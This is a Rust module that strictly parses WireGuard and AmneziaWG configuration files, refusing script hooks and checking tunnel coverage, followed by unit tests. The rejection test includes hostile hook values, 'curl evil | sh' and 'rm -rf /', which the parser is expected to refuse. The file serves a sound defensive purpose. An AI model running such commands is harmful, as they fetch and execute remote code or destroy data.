//! Strict WireGuard / AmneziaWG `.conf` parsing. Only the keys needed to connect are accepted;
//! script hooks (`PreUp`, `PostUp`, ...) and routing-table controls are always rejected.
use anyhow::{bail, ensure, Context, Result};
use base64::{engine::general_purpose::STANDARD, Engine};
use std::{collections::BTreeMap, net::IpAddr};

pub const MAX_CONFIG: usize = 64 * 1024;

pub struct WgPeer {
    pub public_key: String,
    pub preshared_key: Option<String>,
    pub host: String,
    pub port: u16,
    pub allowed_ips: Vec<String>,
    pub keepalive: Option<String>,
}

// Deliberately not Debug: contains the private key.
pub struct WgConfig {
    pub private_key: String,
    pub addresses: Vec<String>,
    pub dns: Vec<IpAddr>,
    pub mtu: Option<u16>,
    pub peer: WgPeer,
    /// amneziawg-go UAPI parameter name -> value. Empty for plain WireGuard.
    pub obfuscation: BTreeMap<&'static str, String>,
}

impl WgConfig {
    pub fn is_amnezia(&self) -> bool {
        !self.obfuscation.is_empty()
    }
    /// AllowedIPs lists 0.0.0.0/0, so the TUN can take the default routes. Any other list becomes
    /// the TUN's exact route list.
    pub fn routes_everything(&self) -> bool {
        self.peer.allowed_ips.iter().any(|p| p == "0.0.0.0/0")
    }
    /// AllowedIPs send every public IPv4 address through the tunnel, also when they are split
    /// into pieces (`0.0.0.0/1, 128.0.0.0/1`) or leave only private ranges out (the "exclude
    /// private IPs" lists of WireGuard apps). Such a profile carries the internet, and replies
    /// to remote SSH sessions, just like 0.0.0.0/0.
    pub fn full_tunnel(&self) -> bool {
        covers_public_ipv4(
            self.peer
                .allowed_ips
                .iter()
                .map(String::as_str)
                .filter_map(ipv4_range),
        )
    }
    pub fn kind(&self) -> &'static str {
        if self.is_amnezia() {
            "amneziawg"
        } else {
            "wireguard"
        }
    }
}

fn key(name: &str, value: &str) -> Result<String> {
    let raw = STANDARD
        .decode(value)
        .ok()
        .filter(|raw| raw.len() == 32)
        .with_context(|| format!("{name} must be a base64 32-byte key"))?;
    Ok(STANDARD.encode(raw))
}

/// `a.b.c.d/n` or `x::/n`; returned in canonical text form.
pub fn prefix(value: &str) -> Result<String> {
    let (address, bits) = value.split_once('/').unwrap_or((value, ""));
    let address: IpAddr = address.parse().context("Invalid IP address")?;
    let max = if address.is_ipv4() { 32 } else { 128 };
    let bits = if bits.is_empty() {
        max
    } else {
        bits.parse::<u8>()
            .ok()
            .filter(|b| *b <= max)
            .context("Invalid prefix length")?
    };
    Ok(format!("{address}/{bits}"))
}

/// True when the IPv4 ranges (first and last address, inclusive) together contain every public
/// IPv4 address: what a full tunnel takes over, whether it says `0.0.0.0/0`, splits it into
/// pieces (`0.0.0.0/1` and `128.0.0.0/1`, as OpenVPN's `redirect-gateway def1` does) or leaves
/// only private ranges out. Shared by WireGuard's AllowedIPs and OpenVPN's routes.
pub(crate) fn covers_public_ipv4(ranges: impl IntoIterator<Item = (u32, u32)>) -> bool {
    // Ranges that no remote internet host uses: this network, private, shared (CGNAT),
    // loopback, link-local, multicast and reserved.
    const NOT_PUBLIC: [&str; 8] = [
        "0.0.0.0/8",
        "10.0.0.0/8",
        "100.64.0.0/10",
        "127.0.0.0/8",
        "169.254.0.0/16",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "224.0.0.0/3",
    ];
    let mut ranges: Vec<(u32, u32)> = ranges
        .into_iter()
        .chain(NOT_PUBLIC.into_iter().filter_map(ipv4_range))
        .collect();
    ranges.sort_unstable();
    // Walk the sorted ranges and look for the first address none of them contains.
    let mut next = 0u64;
    for (start, end) in ranges {
        if u64::from(start) > next {
            return false;
        }
        next = next.max(u64::from(end) + 1);
    }
    next > u64::from(u32::MAX)
}

/// The first and last address of an IPv4 prefix in `a.b.c.d/n` form; `None` for IPv6.
fn ipv4_range(prefix: &str) -> Option<(u32, u32)> {
    let (address, bits) = prefix.split_once('/')?;
    let address: std::net::Ipv4Addr = address.parse().ok()?;
    let bits: u32 = bits.parse().ok().filter(|b| *b <= 32)?;
    let mask = u32::MAX.checked_shl(32 - bits).unwrap_or(0);
    let start = u32::from(address) & mask;
    Some((start, start | !mask))
}

fn number(name: &str, value: &str, max: u64) -> Result<u64> {
    value
        .parse::<u64>()
        .ok()
        .filter(|n| *n <= max)
        .with_context(|| format!("{name} must be a number up to {max}"))
}

/// `N` or `lo-hi` (inclusive) as used by AmneziaWG 2.0 ranges.
fn range(name: &str, value: &str, max: u64) -> Result<(u64, u64)> {
    match value.split_once('-') {
        Some((lo, hi)) => {
            let (lo, hi) = (number(name, lo.trim(), max)?, number(name, hi.trim(), max)?);
            ensure!(lo <= hi, "{name} range must be ascending");
            Ok((lo, hi))
        }
        None => {
            let n = number(name, value, max)?;
            Ok((n, n))
        }
    }
}

fn boolean(name: &str, value: &str) -> Result<bool> {
    match value.to_ascii_lowercase().as_str() {
        "on" | "true" | "1" | "yes" => Ok(true),
        "off" | "false" | "0" | "no" => Ok(false),
        _ => bail!("{name} must be on or off"),
    }
}

/// Validates an AmneziaWG signature-packet chain such as `<b 0x0102><r 16><t>`.
fn signature_chain(name: &str, value: &str) -> Result<()> {
    ensure!(value.len() <= 4096, "{name} is too long");
    let mut rest = value.trim();
    ensure!(!rest.is_empty(), "{name} is empty");
    while !rest.is_empty() {
        let body = rest
            .strip_prefix('<')
            .and_then(|r| r.split_once('>'))
            .with_context(|| format!("{name} must be a sequence of <...> tags"))?;
        let (tag, after) = body;
        let mut parts = tag.split_ascii_whitespace();
        match (parts.next(), parts.next(), parts.next()) {
            (Some("b"), Some(hex), None) => {
                let hex = hex.strip_prefix("0x").unwrap_or(hex);
                ensure!(
                    !hex.is_empty()
                        && hex.len().is_multiple_of(2)
                        && hex.len() <= 4000
                        && hex.bytes().all(|b| b.is_ascii_hexdigit()),
                    "{name} has an invalid <b> byte string"
                );
            }
            (Some("r" | "rc" | "rd" | "dz"), Some(count), None) => {
                number(name, count, 1280)?;
            }
            (Some("t" | "d" | "ds"), None, None) => {}
            _ => bail!("{name} contains an unsupported tag <{tag}>"),
        }
        rest = after.trim_start();
    }
    Ok(())
}

fn endpoint(value: &str) -> Result<(String, u16)> {
    let (host, port) = if let Some(rest) = value.strip_prefix('[') {
        let (host, port) = rest.split_once("]:").context("Invalid IPv6 endpoint")?;
        (host.to_string(), port)
    } else {
        let (host, port) = value
            .rsplit_once(':')
            .context("Endpoint must be host:port")?;
        (host.to_string(), port)
    };
    let port = port
        .parse::<u16>()
        .ok()
        .filter(|p| *p != 0)
        .context("Invalid endpoint port")?;
    ensure!(
        !host.is_empty()
            && host.len() <= 253
            && host
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':')),
        "Invalid endpoint host"
    );
    Ok((host, port))
}

pub fn parse(text: &str) -> Result<WgConfig> {
    ensure!(text.len() <= MAX_CONFIG, "Configuration exceeds 64 KiB");
    ensure!(
        !text
            .chars()
            .any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t')),
        "Configuration contains control characters"
    );
    let mut section = "";
    let mut peers = 0;
    let mut interface: BTreeMap<String, String> = BTreeMap::new();
    let mut peer: BTreeMap<String, String> = BTreeMap::new();
    for raw in text.lines() {
        let line = raw.split(['#', ';']).next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            section = match line.to_ascii_lowercase().as_str() {
                "[interface]" => "interface",
                "[peer]" => {
                    peers += 1;
                    "peer"
                }
                _ => bail!("Unsupported section {line}"),
            };
            continue;
        }
        let (name, value) = line.split_once('=').context("Expected Key = Value")?;
        let (name, value) = (name.trim(), value.trim());
        let target = match section {
            "interface" => &mut interface,
            "peer" => &mut peer,
            _ => bail!("Settings must be inside [Interface] or [Peer]"),
        };
        ensure!(
            target
                .insert(name.to_ascii_lowercase(), value.to_string())
                .is_none(),
            "Duplicate setting {name}"
        );
    }
    ensure!(peers == 1, "Exactly one [Peer] is supported");

    let mut obfuscation = BTreeMap::new();
    let (mut private_key, mut addresses, mut dns, mut mtu) = (None, vec![], vec![], None);
    for (name, value) in &interface {
        match name.as_str() {
            "privatekey" => private_key = Some(key("PrivateKey", value)?),
            "address" => {
                for item in value.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                    addresses.push(prefix(item)?);
                }
            }
            "dns" => {
                for item in value.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                    dns.push(
                        item.parse::<IpAddr>().context(
                            "DNS must list IP addresses; search domains are not supported",
                        )?,
                    );
                }
            }
            "mtu" => {
                mtu = Some(number("MTU", value, 1500).and_then(|m| {
                    ensure!(m >= 1280, "MTU must be between 1280 and 1500");
                    Ok(m as u16)
                })?)
            }
            "listenport" => {
                number("ListenPort", value, 65535)?;
            }
            "jc" => {
                number("Jc", value, 128)?;
                obfuscation.insert("jc", value.clone());
            }
            "jmin" | "jmax" => {
                number(name, value, 1280)?;
                obfuscation.insert(if name == "jmin" { "jmin" } else { "jmax" }, value.clone());
            }
            "s1" | "s2" | "s3" | "s4" => {
                number(name, value, 1280)?;
                let uapi = match name.as_str() {
                    "s1" => "s1",
                    "s2" => "s2",
                    "s3" => "s3",
                    _ => "s4",
                };
                obfuscation.insert(uapi, value.clone());
            }
            "h1" | "h2" | "h3" | "h4" => {
                range(name, value, u32::MAX as u64)?;
                let uapi = match name.as_str() {
                    "h1" => "h1",
                    "h2" => "h2",
                    "h3" => "h3",
                    _ => "h4",
                };
                obfuscation.insert(uapi, value.replace(' ', ""));
            }
            "i1" | "i2" | "i3" | "i4" | "i5" => {
                signature_chain(name, value)?;
                let uapi = match name.as_str() {
                    "i1" => "i1",
                    "i2" => "i2",
                    "i3" => "i3",
                    "i4" => "i4",
                    _ => "i5",
                };
                obfuscation.insert(uapi, value.clone());
            }
            "headerprotectionkey" => {
                let raw = STANDARD
                    .decode(value)
                    .ok()
                    .filter(|r| r.len() == 32)
                    .context("HeaderProtectionKey must be a base64 32-byte key")?;
                obfuscation.insert("header_protection_key", hex::encode(raw));
            }
            "contentpaddingaddition"
            | "rekeyaftertime"
            | "rekeytimeout"
            | "rejectaftertime"
            | "keepalivetimeout"
            | "maxhandshakeattempts" => {
                range(name, value, u32::MAX as u64)?;
                let uapi = match name.as_str() {
                    "contentpaddingaddition" => "content_padding_addition",
                    "rekeyaftertime" => "rekey_after_time",
                    "rekeytimeout" => "rekey_timeout",
                    "rejectaftertime" => "reject_after_time",
                    "keepalivetimeout" => "keepalive_timeout",
                    _ => "max_handshake_attempts",
                };
                obfuscation.insert(uapi, value.replace(' ', ""));
            }
            "randomtrailers" | "disablecookies" => {
                let enabled = boolean(name, value)?;
                let uapi = if name == "randomtrailers" {
                    "random_trailers"
                } else {
                    "disable_cookies"
                };
                obfuscation.insert(uapi, enabled.to_string());
            }
            // Removed from current AmneziaWG; harmless to ignore in older exports.
            "j1" | "j2" | "j3" | "itime" => {}
            "preup" | "postup" | "predown" | "postdown" => {
                bail!("Script hooks ({name}) are never accepted")
            }
            _ => bail!("Unsupported [Interface] setting {name}"),
        }
    }
    let private_key = private_key.context("[Interface] needs a PrivateKey")?;
    ensure!(!addresses.is_empty(), "[Interface] needs an Address");
    if let (Some(lo), Some(hi)) = (obfuscation.get("jmin"), obfuscation.get("jmax")) {
        ensure!(
            lo.parse::<u64>()? <= hi.parse::<u64>()?,
            "Jmin must not exceed Jmax"
        );
    }
    let mut headers: Vec<(u64, u64)> = vec![];
    for name in ["h1", "h2", "h3", "h4"] {
        if let Some(value) = obfuscation.get(name) {
            let span = range(name, value, u32::MAX as u64)?;
            ensure!(
                headers.iter().all(|(lo, hi)| span.1 < *lo || span.0 > *hi),
                "H1-H4 must not overlap"
            );
            headers.push(span);
        }
    }
    if obfuscation.contains_key("header_protection_key") {
        for name in ["s1", "s2", "s3", "s4"] {
            ensure!(
                obfuscation
                    .get(name)
                    .and_then(|v| v.parse::<u64>().ok())
                    .is_some_and(|v| v >= 12),
                "HeaderProtectionKey requires S1-S4 of at least 12"
            );
        }
    }

    let (mut public_key, mut preshared_key, mut target, mut allowed_ips, mut keepalive) =
        (None, None, None, vec![], None);
    for (name, value) in &peer {
        match name.as_str() {
            "publickey" => public_key = Some(key("PublicKey", value)?),
            "presharedkey" => preshared_key = Some(key("PresharedKey", value)?),
            "endpoint" => target = Some(endpoint(value)?),
            "allowedips" => {
                for item in value.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                    allowed_ips.push(prefix(item)?);
                }
            }
            "persistentkeepalive" => {
                range("PersistentKeepalive", value, 65535)?;
                keepalive = Some(value.replace(' ', ""));
            }
            "advancedsecurity" => ensure!(
                !boolean("AdvancedSecurity", value)?,
                "AdvancedSecurity needs the AmneziaWG kernel module and is not supported"
            ),
            _ => bail!("Unsupported [Peer] setting {name}"),
        }
    }
    let (host, port) = target.context("[Peer] needs an Endpoint")?;
    ensure!(!allowed_ips.is_empty(), "[Peer] needs AllowedIPs");
    Ok(WgConfig {
        private_key,
        addresses,
        dns,
        mtu,
        peer: WgPeer {
            public_key: public_key.context("[Peer] needs a PublicKey")?,
            preshared_key,
            host,
            port,
            allowed_ips,
            keepalive,
        },
        obfuscation,
    })
}

pub fn looks_like_config(text: &str) -> bool {
    text.lines()
        .any(|line| line.trim().eq_ignore_ascii_case("[interface]"))
}

#[cfg(test)]
mod tests {
    use super::*;
    const PRIVATE: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PUBLIC: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

    fn config(extra_interface: &str, extra_peer: &str) -> String {
        format!("[Interface]\nPrivateKey = {PRIVATE}\nAddress = 10.8.1.2/32\nDNS = 1.1.1.1, 1.0.0.1\n{extra_interface}\n[Peer]\nPublicKey = {PUBLIC}\nEndpoint = vpn.example.com:51820\nAllowedIPs = 0.0.0.0/0, ::/0\n{extra_peer}\n")
    }

    #[test]
    fn plain_wireguard_parses() {
        let c = parse(&config("MTU = 1420", "PersistentKeepalive = 25")).unwrap();
        assert_eq!(c.kind(), "wireguard");
        assert!(c.full_tunnel() && c.routes_everything());
        assert_eq!(c.peer.host, "vpn.example.com");
        assert_eq!(c.peer.port, 51820);
        assert_eq!(c.dns.len(), 2);
        assert_eq!(c.mtu, Some(1420));
    }

    #[test]
    fn amneziawg_legacy_and_v2_parameters_map_to_uapi() {
        let legacy = parse(&config("Jc = 4\nJmin = 40\nJmax = 70\nS1 = 50\nS2 = 100\nH1 = 1234\nH2 = 5678\nH3 = 9012\nH4 = 3456", "")).unwrap();
        assert_eq!(legacy.kind(), "amneziawg");
        assert_eq!(legacy.obfuscation["h3"], "9012");
        let v2 = parse(&config(
            "Jc = 4\nJmin = 10\nJmax = 50\nS1 = 24\nS2 = 28\nS3 = 16\nS4 = 12\nH1 = 100-199\nH2 = 200-299\nH3 = 300-399\nH4 = 400-499\nI1 = <b 0xc6000000><r 16><t>\nHeaderProtectionKey = q83vEjRWeJCrze8SNFZ4kKvN7xI0VniQq83vEjRWeJA=\nRandomTrailers = on\nJ1 = <r 2>\nItime = 120",
            "PersistentKeepalive = 25-35\nAdvancedSecurity = off",
        ))
        .unwrap();
        assert_eq!(v2.obfuscation["h1"], "100-199");
        assert_eq!(v2.obfuscation["random_trailers"], "true");
        assert_eq!(v2.obfuscation["header_protection_key"].len(), 64);
        assert_eq!(v2.peer.keepalive.as_deref(), Some("25-35"));
    }

    #[test]
    fn dangerous_and_malformed_configs_are_rejected() {
        for bad in [
            config("PostUp = curl evil | sh", ""),
            config("PreDown = rm -rf /", ""),
            config("Table = off", ""),
            config("FwMark = 51820", ""),
            config("SaveConfig = true", ""),
            config("H1 = 100-300\nH2 = 200-400", ""),
            config("I1 = <exec calc>", ""),
            config("Jmin = 90\nJmax = 10", ""),
            config(
                "HeaderProtectionKey = q83vEjRWeJCrze8SNFZ4kKvN7xI0VniQq83vEjRWeJA=\nS1 = 4",
                "",
            ),
            config("", "AdvancedSecurity = on"),
            config("Unknown = 1", ""),
            config("", "[Peer]\nPublicKey = x"),
            config("", "").replace(PUBLIC, "not-a-key"),
        ] {
            assert!(parse(&bad).is_err(), "accepted: {bad}");
        }
        // The only DNS line names a search domain (the helper already has a DNS line).
        let search = config("", "").replace("DNS = 1.1.1.1, 1.0.0.1", "DNS = corp.example");
        let error = parse(&search).err().expect("search domain accepted");
        assert!(error.to_string().contains("search domains"), "{error}");
    }

    #[test]
    fn tunnels_that_cover_every_public_address_are_full() {
        let allowed = |ips: &str| {
            parse(&config("", "").replace(
                "AllowedIPs = 0.0.0.0/0, ::/0",
                &format!("AllowedIPs = {ips}"),
            ))
            .unwrap()
        };
        // The "exclude private IPs" list of the WireGuard apps.
        let public = "0.0.0.0/5, 8.0.0.0/7, 11.0.0.0/8, 12.0.0.0/6, 16.0.0.0/4, 32.0.0.0/3, 64.0.0.0/2, 128.0.0.0/3, 160.0.0.0/5, 168.0.0.0/6, 172.0.0.0/12, 172.32.0.0/11, 172.64.0.0/10, 172.128.0.0/9, 173.0.0.0/8, 174.0.0.0/7, 176.0.0.0/4, 192.0.0.0/9, 192.128.0.0/11, 192.160.0.0/13, 192.169.0.0/16, 192.170.0.0/15, 192.172.0.0/14, 192.176.0.0/12, 192.192.0.0/10, 193.0.0.0/8, 194.0.0.0/7, 196.0.0.0/6, 200.0.0.0/5, 208.0.0.0/4";
        for full in ["0.0.0.0/0", "0.0.0.0/1, 128.0.0.0/1, ::/0", public] {
            let c = allowed(full);
            assert!(c.full_tunnel(), "{full} is a full tunnel");
        }
        assert!(!allowed("0.0.0.0/1, 128.0.0.0/1").routes_everything());
        let gap = public.replace("8.0.0.0/7, ", "");
        for split in [
            "192.168.1.0/24, 10.6.0.0/24",
            "0.0.0.0/1",
            "::/0",
            gap.as_str(),
        ] {
            assert!(!allowed(split).full_tunnel(), "{split} is split");
        }
    }
}
